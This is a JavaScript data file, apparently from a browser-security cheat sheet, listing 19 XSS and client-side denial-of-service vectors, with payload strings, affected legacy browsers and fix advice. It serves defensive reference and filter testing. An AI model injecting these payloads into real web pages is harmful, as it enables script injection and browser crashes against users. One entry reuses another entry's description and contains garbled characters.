/* Items - the set of available items and vectors */
var items = 
[
    { /* ID 1 - XSS via formaction - requiring user interaction */
        'id'         : 1, 
        'category'   : 'html5', 
        'name'       : 'XSS via formaction - requiring user interaction',
        'data'       : '<form id="test" /><button form="test" formaction="%js_uri_alert%">X',
        'description': 'A vector displaying the HTML5 form and formaction capabilities for form hijacking outside the actual form.',
        'tickets'    : [],
        'howtofix'   : 'Don\'t allow users to submit markup containing form and formaction attributes or transform them to bogus attributes',
        'browsers'   : {
            'opera': ['10.5']
        },
        'tags'       : ['xss', 'html5', 'ff', 'gc'],
        'reporter'   : '.mario'
    },
    { /* ID 2 - XSS via x-imap4-modified-utf7 (1) */
        'id'         : 2, 
        'category'   : 'charset', 
        'name'       : 'XSS via x-imap4-modified-utf7 (1)',
        'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_1%',
        'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
        'tickets'    : [],
        'howtofix'   : '',
        'browsers'   : {
            'firefox': [
                '2.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'utf7', 'ff', 'charset'],
        'reporter'   : '.mario'
    },
    { /* ID 3 - XSS via x-imap4-modified-utf7 (2) */
        'id'         : 3, 
        'category'   : 'charset', 
        'name'       : 'XSS via x-imap4-modified-utf7 (2)',
        'data'       : '<meta charset="x-imap4-modified-utf7">%js_utf7_alert_2%',
        'description': 'This vector shows how UTF7 derivations can be used to generate very hard to detect XSS vectors in exotic charsets',
        'tickets'    : [],
        'howtofix'   : '',            
        'browsers'   : {
            'firefox': [
                '2.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'utf7', 'ff', 'charset'],
        'reporter'   : '.mario'
    },
    { /* ID 4 - Self-including DOM Worker XSS */
        'id'         : 4, 
        'category'   : 'dom', 
        'name'       : 'Self-including DOM Worker XSS',
        'data'       : '0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))',
        'description': 'A self-including code snippet utilizing a DOM worker and firing a message event to itself causing script execution',
        'tickets'    : [],
        'howtofix'   : '',            
        'browsers'   : {
            'firefox': [
                '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'dom', 'ff', 'worker'],
        'reporter'   : '.mario'
    },
    { /* ID 5 - Firefox crypto object - hidden eval() */
        'id'         : 5, 
        'category'   : 'dom', 
        'name'       : 'Firefox crypto object - hidden eval()',
        'data'       : 'crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')',
        'description': 'This vector uncovers a hidden eval() inside the Firefox crypto object',
        'tickets'    : [],
        'howtofix'   : '',            
        'browsers'   : {
            'firefox': [
                '2.x', '3.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'dom', 'ff', 'crypto', 'eval', 'csp'],
        'reporter'   : '.mario'
    },
    { /* ID 6 - Firefox setter based JavaScript execution */
        'id'         : 6, 
        'category'   : 'javascript', 
        'name'       : 'Firefox setter based JavaScript execution',
        'data'       : '({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%',
        'description': 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
        'tickets'    : [],
        'howtofix'   : '',            
        'browsers'   : {
            'firefox': [
                '1.x', '2.x', '3.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'dom', 'ff', 'setter'],
        'reporter'   : '.mario'
    },
    { /* ID 7 - Self-executing focus event via autofocus */
        'id'         : 7, 
        'category'   : 'html5', 
        'name'       : 'Self-executing focus event via autofocus',
        'data'       : '<input onfocus=%js_write% autofocus>',
        'description': 'This vector uses an input element with autofocus to call its own focus event handler - no user interaction required',
        'tickets'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
        'howtofix'   : '',            
        'browsers'   : {
            'opera': [
                '10.5'
            ],
            'chrome': [
                '4.0', '5.0'
            ]
        },
        'tags'       : ['xss', 'autofocus', 'chrome', 'opera'],
        'reporter'   : 'gaz'
    },
    { /* ID 8 - Self-executing blur event via autofocus competition */
        'id'         : 8, 
        'category'   : 'html5', 
        'name'       : 'Self-executing blur event via autofocus competition',
        'data'       : '<input onblur=%js_write% autofocus><input autofocus>',
        'description': 'Here we have two HTML input elements competing for the focus - and one executing JavaScript on losing its focus',
        'tickets'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
        'howtofix'   : '',            
        'browsers'   : {
            'opera': [
                '10.5'
            ],
            'chrome': [
                '4.0', '5.0'
            ]
        },
        'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 9 - Opera link-source JavaScript execution via CSS */
        'id'         : 9, 
        'category'   : 'css', 
        'name'       : 'Opera link-source JavaScript execution via CSS',
        'data'       : '<div style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
        'description': 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript',
        'tickets'    : [],
        'howtofix'   : '',            
        'browsers'   : {
            'opera': [
                '8.0', '9.0', '10.0', '10.5'
            ]
        },
        'tags'       : ['xss', 'css', 'link-source', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 10 - JavaScript execution via <VIDEO> poster attribute  */
        'id'         : 10, 
        'category'   : 'html5', 
        'name'       : 'JavaScript execution via <VIDEO> poster attribute',
        'data'       : '<video poster=%js_uri_alert%//',
        'description': 'Opera 10.5+ allows using poster attrubtes in combination with javascript: URIs',
        'tickets'    : [],
        'howtofix'   : 'Make sure only relative URIs, http URIs and correctly MIME-typed data URIs can be used for VIDEO poster attribuites',            
        'browsers'   : {
            'opera': [
                '10.5'
            ]
        },
        'tags'       : ['xss', 'poster', 'video', 'opera', 'html5'],
        'reporter'   : '.mario'
    },
    { /* ID 11 - SVG executing JavaScript via <G> tag and onload attribute  */
        'id'         : 11, 
        'category'   : 'svg', 
        'name'       : 'SVG executing JavaScript via <G> tag and onload attribute',
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><g onload="%js_uri_alert%"></g></svg>',
        'description': 'SVG files can execute JavaScript via onload events on any element without user interaction',
        'tickets'    : [],
        'howtofix'   : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbirary HTML data as well as event handlers in native elements',            
        'browsers'   : {
            'opera': [
                '10.0', '10.5'
            ],
            'chrome': [
                '4.0', '5.5'
            ],
            'firefox': [
                '3.0', '3.5', '3.7', '3.7'
            ]            
        },
        'tags'       : ['xss', 'svg', 'onload', 'opera', 'firefox', 'chrome'],
        'reporter'   : '.mario'
    },
    { /* ID 12 - Self-executing JavaScript via <BODY> onscroll autofocus */
        'id'         : 12,
        'category'   : 'html5', 
        'name'       : 'Self-executing JavaScript via <BODY> onscroll autofocus',
        'data'       : '<body onscroll=%js_write%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
        'description': 'This vector triggers an onscroll event executing JavaScript on <BODY> due to an autofocus on an <INPUT> way further down the page.',
        'tickets'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
        'howtofix'   : '',            
        'browsers'   : {
            'opera': [
                '10.5'
            ],
            'chrome': [
                '4.0', '5.0'
            ]
        },
        'tags'       : ['xss', 'autofocus', 'scroll', 'chrome', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 13 - Client-side denial of service via repeat templates */
        'id'         : 13,
        'category'   : 'dos', 
        'name'       : 'Client-side denial of service via repeat templates',
        'data'       : '<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
        'description': 'This vector uses the repeat template systax specifies in the WebForms 2.0 draft. By using nested tags repeating themselves allover again the client can be forced to deny service or even crash.',
        'tickets'    : [],
        'howtofix'   : 'Avoid allowing users submitting HTML containing repeat or repeat-start/-end attributes. If necessary validate the numerical values used for them to be reasonably small.',            
        'browsers'   : {
            'opera': [
                '10.0'
            ]
        },
        'tags'       : ['dos', 'repeat', 'template', 'webforms', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 14 - Client-side denial of service via faulty regular expressions */
        'id'         : 14,
        'category'   : 'dos', 
        'name'       : 'Client-side denial of service via faulty regular expressions',
        'data'       : '<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
        'description': 'Opera 10 allows client side validation via the pattern attribute. In case the pattern value is a badly written regex the client can be "dossed" with short customized character sequences.',
        'tickets'    : [],
        'howtofix'   : 'Don\'t allow users to submit HTML containing pattern attributes and make sure your own client side regular expressions used for validation are well written and not vulnerable against easy Redos attacks.',            
        'browsers'   : {
            'opera': [
                '10.0'
            ]
        },
        'tags'       : ['dos', 'pattern', 'regex', 'html5', 'validation', 'opera'],
        'reporter'   : '.mario'
    },
    { /* ID 15 - JavaScript execution via sharp variables */
        'id'         : 15,
        'category'   : 'javascript', 
        'name'       : 'JavaScript execution via sharp variables',
        'data'       : '({0:#0=%js_alert_only%/#0#/#0#(0)})',
        'description': 'This vector demonstrates how sharp variables and cyclic references can be used for obfuscation to hide the actual method execution.',
        'tickets'    : [],
        'howtofix'   : '',            
        'browsers'   : {
            'firefox': [
                '2.x', '3.0', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'javascript', 'firefox', 'sharp'],
        'reporter'   : '.mario'
    },
    { /* ID 16 - Using onbegin and HTML+TIME to execute JavaScript */
        'id'         : 16,
        'category'   : 'htmlplustime', 
        'name'       : 'Using onbegin and HTML+TIME to execute JavaScript',
        'data'       : 'X<x style=`behavior:url(#default#time2)` onbegin=`%js_write%` >',
        'description': 'The HTML+TIME behavior allows to use arbitrary tags to execute JavaScript via onbegin event handlers.',
        'tickets'    : [],
        'howtofix'   : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on black lists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',            
        'browsers'   : {
            'ie': [
                '5.5', '6.0', '7.0', '8.0', '9.0'
            ]
        },
        'tags'       : ['xss', 'javascript', 'ie', 'sharp'],
        'reporter'   : '.mario'
    },
    { /* ID 17 - Opera XML-stylesheets executing JavaScript */
        'id'         : 17,
        'category'   : 'xml', 
        'name'       : 'Opera XML-stylesheets executing JavaScript',
        'data'       : '<?xml-stylesheet href="%js_uri_alert%"?>',
        'description': 'Opera 9.x and 10.0 allow to apply XML-stylesheets with JavaScript URIs and executes the JavaScript afterwards without user interaction.',
        'tickets'    : [],
        'howtofix'   : 'Make sure that user input cannot contain XML stylesheets or tags not consisting of <\\w+ - because this vector would only be matched via <\\?\\w+ but still executes JavaScript without user interaction. Avoid blacklists is possible.',            
        'browsers'   : {
            'opera': [
                '9.x', '10.0'
            ]
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
        'reporter'   : '.mario'
    },
    { /* ID 18 - Entities inside <SCRIPT> and comparable tags */
        'id'         : 18,
        'category'   : 'xml', 
        'name'       : 'Entities inside <SCRIPT> and comparable tags',
        'data'       : '<script>&#x61;l&#x65;rt&#40;1)</script>',
        'description': 'By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and redered as X(HT)ML',
        'tickets'    : [],
        'howtofix'   : 'Make sure filters and detection systems consider the fact of having entities to be allowed inbetween <SCRIPT>, <STYLE> and other tags - and not only in attributes.',            
        'browsers'   : {
            'opera': [], 'firefox' : [], 'chrome': []
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
        'reporter'   : '.mario'
    },
    { /* ID 19 - XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew */
        'id'         : 19,
        'category'   : 'charset', 
        'name'       : 'XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew',
        'data'       : '<meta charset="mac-farsi">�script�alert(1)�/script�',
        'description': 'By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and redered as X(HT)ML',
        'tickets'    : [],
        'howtofix'   : 'User input should never allow <META> tags to avoid re-setting the charset. In case the website is encoded in one of the affected charsets make sure ton have your filter be aware that for Firefox &#60; (<) and &#188 are equivalent - as well as other characters too.',            
        'browsers'   : {
            'firefox' : [
                '2.x', '3.x', '3.5', '3.6', '3.7'
            ]
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
        'reporter'   : 'yosuke.hasegawa'
    },  
]